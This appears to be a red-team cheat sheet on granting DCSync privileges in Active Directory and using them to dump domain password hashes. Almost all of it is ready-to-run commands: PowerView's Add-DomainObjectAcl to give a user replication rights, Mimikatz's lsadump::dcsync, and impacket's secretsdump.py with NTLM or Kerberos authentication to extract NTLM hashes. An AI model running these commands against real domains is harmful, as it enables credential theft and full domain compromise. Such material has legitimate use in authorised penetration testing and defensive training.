---
legal-banner: true
---

### **Introduction**

Granting DCSync privileges allows a user to replicate domain data, which includes sensitive information such as password hashes.  

### **Steps to Grant DCSync Privileges**

1. Grant DCSync privileges using PowerView:  
   ```powershell
   Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
   ```

2. Perform a DCSync attack with Mimikatz:  
   ```powershell
   Invoke-Mimikatz -Command '"lsadump::dcsync /user:[DOMAINNAME]\[ANYDOMAINUSER]"'
   ```

3. Run DCSync using NTLM authentication:  
   ```bash
   secretsdump.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP_ADDRESS] -just-dc-ntlm
   ```

4. Run secretsdump.py with Kerberos authentication:  
   ```bash
   secretsdump.py -no-pass -k <Domain>/<Username>@<DC_IP_or_FQDN> -just-dc-ntlm
   ```
